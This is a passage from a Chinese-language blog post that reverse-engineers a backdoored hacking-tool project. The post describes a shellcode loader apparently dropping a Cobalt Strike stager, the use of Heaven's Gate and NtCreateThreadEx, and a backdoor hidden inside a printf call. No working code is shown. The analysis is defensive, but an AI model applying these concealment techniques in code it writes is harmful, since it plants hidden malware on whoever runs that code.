&lt;p&gt;栈字符串解密-&amp;gt;动态获取VirutalAllocEx-&amp;gt;动态获取WriteProcessMemory-&amp;gt;alloc+write将shellcode1写入内存-&amp;gt;创建一块可执行内存并写入sub_41a8b0处的shellcode2-&amp;gt;执行shellcode2。shellcode1大小经典929，cs stager基本没跑了&lt;/p&gt;

&lt;p&gt;其实看到这里基本已经差不多了，按一般套路来说shellcode2的功能就是createthread、apc、setthreadcontext三选一，但是既然分析还是要分析完，继续看这个shellcode什么功能吧&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221023130424471.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;push 0x33+far ret，哟这不天堂之门么，作者还是有点意思的，将shellcode dump出来，又是一顿分析&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221022233049093.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先调sub_A3然后返回值作为函数指针调用，那么sub_A3就是动态获取函数了，那么把sub_A3单独提取出来，跑了一下，发现获取到的是NtCreatethreadEx，那么到此就结束了。&lt;/p&gt;

&lt;p&gt;但是最开始的问题还没有回答，后门到底是在什么地方执行的呢？&lt;/p&gt;

&lt;p&gt;一通交叉引用，发现后门居然是在最开始标注的printf里&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221022233636692.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不得不说作者还是非常懂逆向人员的心态的，看到输出字符串的函数就会忽略过去，因此就把后门代码藏在这种不显眼的位置。&lt;/p&gt;

&lt;p&gt;对脚本小子们的一记重拳，利好红队开发&lt;/p&gt;</content><author><name></name></author><category term="逆向" /><summary type="html">看到有人转发这个项目说带后门，因为很眼熟这个项目，所以下载下来分析一下。</summary></entry></feed>